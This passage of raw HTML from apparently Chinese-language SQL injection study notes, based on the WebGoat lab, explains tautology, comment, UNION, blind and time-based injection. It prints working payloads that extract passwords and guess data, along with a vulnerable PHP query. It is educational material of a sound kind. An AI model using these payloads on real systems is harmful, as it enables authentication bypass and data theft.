class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- userID 帶入 1234567 or 1=1</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 即可把所有資料撈出來</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">select</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> users </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> employee_id </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1234567</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">or</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"special-characters-sql-injection\">Special characters SQL Injection<a href=\"#special-characters-sql-injection\" class=\"hash-link\" aria-label=\"Special characters SQL Injection的直接連結\" title=\"Special characters SQL Injection的直接連結\">​</a></h4><p>利用 SQL 中的特殊字符（例如註解）進行 SQL Injection：</p><div class=\"language-php codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-php codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># php</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$query = &quot;select * from member where member_id = &#x27;&quot;.$memberID.&quot;&#x27; and password = &#x27;&quot;.$password.&quot;&#x27;;”;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$result = $conn-&gt;query($sql);</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>在 <code>$memberID</code> 的內容中偷偷塞入註解符號 <code>—</code>，如此會變成：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 利用註解達到 SQL Injection</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">select</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> member </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> member_id </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;admin&#x27;</span><span class=\"token plain\"> </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- &#x27; and password = &#x27;pass&#x27;;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"union-based-sql-injection\">UNION based SQL Injection<a href=\"#union-based-sql-injection\" class=\"hash-link\" aria-label=\"UNION based SQL Injection的直接連結\" title=\"UNION based SQL Injection的直接連結\">​</a></h4><p>使用 <!-- -->[UNION]<!-- -->(/Users/pjchen/Projects/Notes/source/<!-- -->_<!-- -->posts/Database/<!-- -->[SQL]<!-- --> 常用指令.md) 只需注意兩個 query 中的欄位「數目」與「資料型別」要相同：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 利用 UNION 搭配「註解」撈出另一個帶有密碼的 user_system_data 表，達到 SQL Inject</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27; UNION SELECT userid, user_name, password, &#x27;</span><span class=\"token plain\">number</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;, &#x27;</span><span class=\"token keyword\" style=\"font-style:italic\">type</span><span class=\"token plain\">&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> cookie</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">0</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">FROM</span><span class=\"token plain\"> user_system_data </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">--</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"blind-sql-injection\">Blind SQL Injection<a href=\"#blind-sql-injection\" class=\"hash-link\" aria-label=\"Blind SQL Injection的直接連結\" title=\"Blind SQL Injection的直接連結\">​</a></h3><p>一般的 SQL injection 和 blind SQL injection 的差別在於，一般的 SQL injection 會從 database 丟出一定的訊息（可能是錯誤訊息），讓我們可以根據這些資訊來嘗試。但是當沒有任何訊息顯示時，你必須要向資料庫詢問 <code>true</code> 或 <code>false</code> 這類的問題（例如，<code>WHERE password = &#x27;123&#x27;</code>），以此來猜測想要取得的資訊。</p><p>Blind SQL injections 有很多種類型，其中包含 <strong>content based</strong> 和 <strong>time based</strong> 的 SQL injection。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"content-based\">Content Based<a href=\"#content-based\" class=\"hash-link\" aria-label=\"Content Based的直接連結\" title=\"Content Based的直接連結\">​</a></h4><p>舉例來說，當我們輸入網址 <code>https://my-shop.com/?article=4</code> 時，伺服器實際會執行如下的 query：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token keyword\" style=\"font-style:italic\">SELECT</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> articles </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> article_id </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">4</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>這時候若我們將網址改成 <code>https://my-shop.com/?article=4 AND 1=1</code> 則 query 的內容會變成：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 得到一樣的資料</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">SELECT</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> articles </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> article_id </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">4</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">AND</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 得不到任何資料</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">SELECT</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> articles </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> article_id </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">4</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">AND</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">2</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>如果這時候可以得到資料內容而不是進到 404 時，表示說我們可以透過 url 來取得一些資料庫相關的資訊，因為這表示 <code>AND</code> 後面的內容有被吃到 SQL 中，例如當我們使用網址 <code>https://my-shop.com?article=4 AND substring(database_version(),1,1) = 2</code>，可以逐一嘗試來猜這資料庫的版本號碼等等。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"time-based\">Time Based<a href=\"#time-based\" class=\"hash-link\" aria-label=\"Time Based的直接連結\" title=\"Time Based的直接連結\">​</a></h4><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">article </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">4</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"> sleep</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">10</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">--</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"搭配-order-by\">搭配 ORDER BY<a href=\"#搭配-order-by\" class=\"hash-link\" aria-label=\"搭配 ORDER BY的直接連結\" title=\"搭配 ORDER BY的直接連結\">​</a></h4><p>當 password 等於 1 時則會按照 lastname 排序，否則按照 firstname 排序，重複此過程如此來猜出密碼：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token keyword\" style=\"font-style:italic\">select</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> users </span><span class=\"token keyword\" style=\"font-style:italic\">order</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">by</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token keyword\" style=\"font-style:italic\">case</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">when</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">password </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;1&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">then</span><span class=\"token plain\"> lastname </span><span class=\"token keyword\" style=\"font-style:italic\">else</span><span class=\"token plain\"> firstname</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"example-blind-sql-injection\">Example: Blind SQL Injection<a href=\"#example-blind-sql-injection\" class=\"hash-link\" aria-label=\"Example: Blind SQL Injection的直接連結\" title=\"Example: Blind SQL Injection的直接連結\">​</a></h4><p>可以使用這段 URL 來測試出 IP：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">http://localhost:8080/WebGoat/SqlInjection/servers?column=(CASE WHEN EXISTS(SELECT id FROM servers WHERE hostname=&#x27;webgoat-prd&#x27; AND substring(ip,1,1)=${item}) THEN id ELSE ip end)</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>原本的 SQL 可能類似：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token keyword\" style=\"font-style:italic\">SELECT</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">FROM</span><span class=\"token plain\"> servers </span><span class=\"token keyword\" style=\"font-style:italic\">ORDER</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">BY</span><span class=\"token plain\"> $orderParams</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>把上面的 url 帶入 SQL 中會變成：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token keyword\" style=\"font-style:italic\">SELECT</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">FROM</span><span class=\"token plain\"> servers </span><span class=\"token keyword\" style=\"font-style:italic\">ORDER</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">BY</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">CASE</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">WHEN</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">EXISTS</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token keyword\" style=\"font-style:italic\">SELECT</span><span class=\"token plain\"> id </span><span class=\"token keyword\" style=\"font-style:italic\">FROM</span><span class=\"token plain\"> servers</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 判斷 servers 中是否真的有 webgoat-prd 這個 hostname（可省略）</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- AND substring(ip,1,1) = 0 -&gt; 這句是關鍵</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 每次取出 ip 欄位中的一個值來嘗試，如果猜對了，則網頁會用 id 排序，否則會用 ip 排序</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token keyword\" style=\"font-style:italic\">WHERE</span><span class=\"token plain\"> hostname</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;webgoat-prd&#x27;</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">AND</span><span class=\"token plain\"> substring</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">ip</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">0</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">THEN</span><span class=\"token plain\"> id</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">ELSE</span><span class=\"token plain\"> ip </span><span class=\"token keyword\" style=\"font-style:italic\">end</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>若要檢查 IP 的第二碼，則 substring 要改成 <code>substring(ip, 2, 1)=0</code>。</p><p>透過 JavaScript 一次送出 10 個 request：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 以下程式會檢查 ip 的第一碼多少</span><span class=\"token 